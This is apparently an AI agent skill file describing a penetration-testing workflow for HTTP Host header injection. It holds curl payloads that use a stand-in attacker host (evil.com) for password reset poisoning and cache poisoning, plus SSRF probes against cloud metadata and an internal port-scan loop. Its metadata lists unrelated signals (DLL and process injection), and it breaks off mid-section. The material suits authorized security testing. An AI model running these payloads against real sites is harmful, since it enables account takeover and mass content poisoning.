---
name: testing-for-host-header-injection
description: "Tests HTTP Host header injection vulnerabilities. Signals: process injection, DLL injection, memory execution."
zh-signals: "Test web applications for HTTP Host header injection vulnerabilities 信号:进程注入,dll注入,内存执行。"
when-to-use: Test web applications for HTTP Host header injection vulnerabilities
  to identify password reset poisoning, web cache poisoning, SSRF, and virtual host
  routing manipulation risks.
domain: cybersecurity
subdomain: web-application-security
tags:
- host-header-injection
- password-reset-poisoning
- cache-poisoning
- virtual-host
- web-security
- header-manipulation
- ssrf
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1055
---

# Testing for Host Header Injection

## When to Use
- When testing password reset functionality for token theft via host manipulation
- During assessment of web caching behavior influenced by Host header values
- When testing virtual host routing and server-side request processing
- During penetration testing of applications behind reverse proxies or load balancers
- When evaluating SSRF potential through Host header manipulation

## Prerequisites
- Burp Suite for intercepting and modifying Host headers
- Understanding of HTTP Host header role in virtual hosting and routing
- Knowledge of alternative host headers (X-Forwarded-Host, X-Host, X-Original-URL)
- Access to an attacker-controlled domain for receiving poisoned requests
- Burp Collaborator or interact.sh for out-of-band detection
- Multiple test accounts for password reset testing


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1 — Test Basic Host Header Injection
```bash
# Supply arbitrary Host header
curl -H "Host: evil.com" http://target.com/ -v
# Check if application reflects evil.com in response

# Double Host header
curl -H "Host: target.com" -H "Host: evil.com" http://target.com/ -v

# Host header with port injection
curl -H "Host: target.com:evil.com" http://target.com/ -v
curl -H "Host: target.com:@evil.com" http://target.com/ -v

# Absolute URL with different Host
curl --request-target "http://target.com/" -H "Host: evil.com" http://target.com/ -v

# Check for different virtual host access
curl -H "Host: admin.target.com" http://target.com/ -v
curl -H "Host: internal.target.com" http://target.com/ -v
curl -H "Host: localhost" http://target.com/ -v
```

### Step 2 — Test Password Reset Poisoning
```bash
# Trigger password reset with modified Host header
# The reset link may use the Host header value in the URL
curl -X POST http://target.com/forgot-password \
  -H "Host: evil.com" \
  -d "email=victim@target.com"
# If reset email contains: http://evil.com/reset?token=xxx
# Attacker receives the token when victim clicks the link

# Try X-Forwarded-Host for password reset poisoning
curl -X POST http://target.com/forgot-password \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=victim@target.com"

# Port-based injection in reset URL
curl -X POST http://target.com/forgot-password \
  -H "Host: target.com:80@evil.com" \
  -d "email=victim@target.com"

# Test with various forwarding headers
for header in "X-Forwarded-Host" "X-Host" "X-Original-URL" "X-Rewrite-URL" "X-Forwarded-Server" "Forwarded"; do
  curl -X POST http://target.com/forgot-password \
    -H "$header: evil.com" \
    -d "email=victim@target.com"
  echo "Tested: $header"
done
```

### Step 3 — Test Web Cache Poisoning via Host Header
```bash
# If caching layer uses URL (without Host) as cache key:
# Poison cache with modified Host header
curl -H "Host: evil.com" http://target.com/ -v
# If response is cached and contains evil.com links
# All subsequent users receive poisoned content

# Test with X-Forwarded-Host for cache poisoning
curl -H "X-Forwarded-Host: evil.com" http://target.com/login -v
# Check X-Cache header to see if response was cached

# Verify cache poisoning
curl http://target.com/login -v
# If response still contains evil.com, cache is poisoned

# Poison JavaScript URLs in cached pages
curl -H "X-Forwarded-Host: evil.com" http://target.com/
# If page loads: <script src="//evil.com/static/app.js">
# Attacker serves malicious JavaScript to all users
```

### Step 4 — Test SSRF via Host Header
```bash
# Backend may use Host header to make internal requests
curl -H "Host: internal-api.target.local" http://target.com/api/proxy

# Access cloud metadata via Host header
curl -H "Host: 169.254.169.254" http://target.com/

# Internal port scanning
for port in 80 443 8080 8443 3000 5000 9200; do
  curl -H "Host: 127.0.0.1:$port" http://target.com/ -o /dev/null -w "%{http_code}" -s
  echo " - Port $port"
done

# SSRF via absolute URL
curl --request-target "http://internal-server/" -H "Host: internal-server" http://target.com/
```

### Step 5 — Test Virtual Host Enumeration
```bash

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
